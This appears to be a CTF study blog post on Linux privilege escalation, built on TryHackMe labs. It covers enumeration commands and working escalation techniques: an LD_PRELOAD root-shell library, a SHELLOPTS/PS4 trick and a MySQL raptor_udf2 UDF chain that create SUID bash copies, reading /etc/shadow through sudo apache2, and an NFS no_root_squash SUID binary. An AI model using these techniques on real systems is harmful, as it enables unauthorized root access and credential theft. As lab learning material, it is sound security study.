---
title: Linux Privilege Escalation
time: 2025-01-27 20:01:22
categories: [CTF, Privilege Escalation]
tags: [privilege-escalation, linux, ctf, suid, sudo, ldpreload]
---

Privilege Escalation is searching for ways to run commands that require elevated access permissions, Eg. reading /etc/shadow file.

## Information Gathering

Once you have access to a remote machine, here is the list of different information to gather to explore ways to escalate privilege:

1. `hostname` - machine name
1. `uname -a` - Operating System information
1. `/proc/version` - only for linux to get kernel details
1. `/etc/issue` - system information
1. `/etc/os-release` - OS information
1. `ps auxjf` - list of running process
1. `env` - environment variables
1. `sudo -l` - check sudo permission
1. `ls` - Accessible files
1. `id` - user information
1. `/etc/passwd` - other available users
1. `history` - interesting commands ran in previous sessions by user
1. `ifconfig` - network info
1. `ip route` - available network routes
1. `netstat` - display network communications

## Automated Enumeration

Different tools to check available escalation options:

- [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)
- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- [Linux Priv Checker](https://github.com/linted/linuxprivchecker)
- [More list of escalation techniques](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#summary)

---

## Escalation Techniques

### kernel exploits

- Check the kernel version of the system: `uname -a`, `cat /proc/version`, `cat /etc/issue`
- Search for any exploit published for that version on [exploit-db](https://www.exploit-db.com/)
- Here is one script to find kernel exploits: [Linux exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh)
- Trick the kernel into running our payload in kernel mode
- Exploit
- Eg. [DirtoCoW](https://dirtycow.ninja/)

Note: Kernel exploit can be irreversable to the system, so run cautiously for the exact version only.

---

### Sudo permissions

- Check sudo permissions: `sudo -l`
- Collated list of ways to use different `sudo` permissions for privilege escalation [GTFObins](https://gtfobins.github.io/)
- Search on the above site and see if any of the binaries can be exploited for privilege escalation
- Check if any of the environment variable retained by `env_keep` can be used for escalation. Eg. `LD_PRELOAD` can be used to override functions from shared library
- exploit
- Eg.

```sh
# Abuse shell debugging feature
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2


# Abuse sudo permission on apache
# Shows first line of shadow file in the error
sudo apache2 -f /etc/shadow

```

- Example of abusing environment variable `LD_PRELOAD` or `LD_LIBRARY_PATH`
- This link [Cheat Inject Feature](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) provides detailed explanation on using above variables to modify the binary behavior.

- Consider this C program

```c
// preload.c

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() { 
  unsetenv("LD_PRELOAD");
  setgid(0); 
  setuid(0); 
  system("/bin/bash"); 
}

```

- Above program can be injected to any binary if we can modify `LD_PRELOAD` or `LD_LIBRARY_PATH` env variable.

```sh
# use LD_PRELOAD:
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
sudo LD_PRELOAD=/tmp/preload.so <program-name-here>

# use LD_LIBRARY_PATH:
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <program-name-here>
```

---

### SUID binaries

- find SUID binaries: `find / -type f -perm -04000 -ls 2>/dev/null`, `find / -type f -perm -u+s -exec ls -l {} \; 2> /dev/null`
- find SGID binaries: `find / -type f -perm -02000 -ls 2>/dev/null`, `find / -type f -perm -g+s -exec ls -l {} \; 2> /dev/null`
- find both: `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
- Use below command to create a password hash if we can edit `passwd` or `shadow` file, Eg. using SUID `cp` or `mv` command

```sh
# create unix password hash:
openssl passwd -1 -salt [salt] [password]
openssl passwd newpasswordhere
mkpasswd -m sha-512 newpasswordhere

```

---

### Cron jobs

- Global cron config is stored in `/etc/crontab`
- see if any script from the job is world writable.

---

### PATH variable

- Check if any binary is using a relative path which can be influenced by the PATH variable: `echo $PATH`

---

### File capabilities:

- find capabilities of all the files under root directory: `getcap -r / 2> /dev/null`
- These capabilities enables extra permissions which are not part of `sudo` permission list, but same approach of `sudo` applies here.
- check `man capabilities` for list of capabilities

---

### Different services

#### mysql escalation

- create payload

```sh
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

- exploit

```sh
mysql -u root

# inside mysql shell
use mysql; 
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';

# exploit
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');


```

#### NFS

- NFS (Network File Sharing) configuration is kept in the /etc/exports file.
- If any directory is shared with `no_root_squash` flag, then it can be exploited
- Consider this c code

```c
// nfs.c

#include <stdlib.h>
#include <unistd.h>

int main()
{
  setgid(0);
  setuid (0);
  system("/bin/bash");
  return 0;
}
```

- Generate the executable and copy it to the mounted share

```sh
# Set SUID as root owner
gcc -static nfs.c -o nfs
chmod +s nfs

# Enumerate mountable shares:
showmount -e 10.0.2.12

# Mount the shared directory

# Craete mount point locally
mkdir /tmp/shmount

# Mount '/backups/' directory from the target machine to local system
mount -o rw 10.0.2.12:/backups /tmp/shmount

cp ./nfs /tmp/shmount

```

- Run the `./nfs` on the target machine

---

## References

- [Linux Privilege Escalation - TryHackMe](https://tryhackme.com/room/linprivesc)
- [Common Escalation Techniques - TryHackMe](https://tryhackme.com/room/linuxprivesc)
